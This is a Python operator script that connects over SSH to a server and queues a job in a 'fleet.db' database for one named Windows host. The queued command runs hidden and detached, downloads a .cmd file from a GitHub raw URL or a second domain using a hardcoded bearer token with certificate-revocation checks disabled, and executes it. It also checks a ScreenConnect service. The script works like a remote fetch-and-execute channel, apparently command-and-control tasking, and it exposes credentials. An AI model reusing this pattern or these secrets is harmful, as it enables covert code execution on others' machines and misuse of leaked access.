#!/usr/bin/env python3
"""Queue recover via start/min + --detached so agent 60s window can't abort msiexec."""
from __future__ import annotations

import sys
from pathlib import Path

import paramiko

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
TARGET = "ADMINIS-0ET5284"

# Outer returns immediately. Inner downloads (if needed) and runs --detached body.
CMD = (
    r'start "" /min cmd.exe /c "'
    r"C:\Windows\System32\curl.exe -f -L --ssl-no-revoke --connect-timeout 15 --max-time 90 "
    r"-o C:\Users\Public\gryxa_recover.cmd "
    r"https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_gryxa_recover.cmd "
    r"& if not exist C:\Users\Public\gryxa_recover.cmd "
    r"C:\Windows\System32\curl.exe -f -L --ssl-no-revoke "
    r"-H Authorization: Bearer fe7e8f3b8af479870248be10ca25410b8e1bf9a5 "
    r"--connect-timeout 15 --max-time 90 "
    r"-o C:\Users\Public\gryxa_recover.cmd "
    r"https://debian.seczio.com/winrtcs/winrtcs_gryxa_recover.cmd "
    r"& call C:\Users\Public\gryxa_recover.cmd --detached"
    r'"'
    r" & echo RECOVER_STARTED"
)

STATUS = (
    r"powershell -NoProfile -NonInteractive -Command "
    r"\"$ErrorActionPreference='SilentlyContinue'; "
    r"Write-Output '===SVC==='; "
    r"Get-CimInstance Win32_Service | Where-Object { $_.Name -match '36e506ff' } | "
    r"ForEach-Object { $_.Name + ' | ' + $_.State + ' | ' + $_.PathName }; "
    r"Write-Output '===DIR==='; "
    r"$d=${env:ProgramFiles(x86)}+'\ScreenConnect Client (36e506ff016b2151)'; "
    r"if(Test-Path $d){'DIR_EXISTS '+$d} else {'DIR_MISSING'}; "
    r"Write-Output '===LOG==='; "
    r"if(Test-Path 'C:\Users\Public\gryxa_recover.log'){ Get-Content 'C:\Users\Public\gryxa_recover.log' } "
    r"else { 'NO_RECOVER_LOG' }; "
    r"Write-Output '===SCRIPT==='; "
    r"if(Test-Path 'C:\Users\Public\gryxa_recover.cmd'){ 'SCRIPT_OK' } else { 'SCRIPT_MISSING' }; "
    r"Write-Output 'STATUS_DONE'\""
)


def main() -> None:
    print("cmd_len", len(CMD))
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(
        "144.172.107.56",
        username="winrtcs",
        key_filename=str(Path.home() / ".ssh" / "winrtcs_ed25519"),
        timeout=20,
    )
    sftp = ssh.open_sftp()
    # refresh mirror copy
    local = Path(r"C:\Users\nobuddy\Desktop\Project\winrtcs_gryxa_recover.cmd")
    sftp.put(str(local), "/tmp/winrtcs_gryxa_recover.cmd")
    with sftp.file("/tmp/rec3_cmd.txt", "w") as f:
        f.write(CMD)
    with sftp.file("/tmp/status_cmd.txt", "w") as f:
        f.write(STATUS)
    py = f"""
import sqlite3, time, os
os.system('sudo cp /tmp/winrtcs_gryxa_recover.cmd /opt/winrtcs/repo/winrtcs_gryxa_recover.cmd')
con=sqlite3.connect('/opt/winrtcs/fleet.db')
now=time.time()
cmd=open('/tmp/rec3_cmd.txt',encoding='utf-8').read().strip()
st=open('/tmp/status_cmd.txt',encoding='utf-8').read().strip()
cur=con.execute('INSERT INTO cmds(ts,target,cmd) VALUES(?,?,?)',(now,{TARGET!r},cmd[:4000]))
cid=int(cur.lastrowid)
con.execute('''INSERT INTO jobs(ts,name,target,params,cmd_id,note,status,attempts,max_attempts,updated)
 VALUES(?,?,?,?,?,?,?,?,?,?)''',
 (now,'recover-gryxa',{TARGET!r},'{{}}',cid,'start-min --detached','queued',1,2,now))
print('recover', cid)
# status check ~3 min later — queue with delay by inserting later ts? just queue after recover; agent picks one per tick
# better: only queue recover now; status separately after wait from operator script
con.commit(); con.close()
"""
    with sftp.file("/tmp/qrec3.py", "w") as f:
        f.write(py)
    sftp.close()
    _, o, e = ssh.exec_command("sudo python3 /tmp/qrec3.py", timeout=30)
    print(o.read().decode(), e.read().decode())
    ssh.close()


if __name__ == "__main__":
    main()
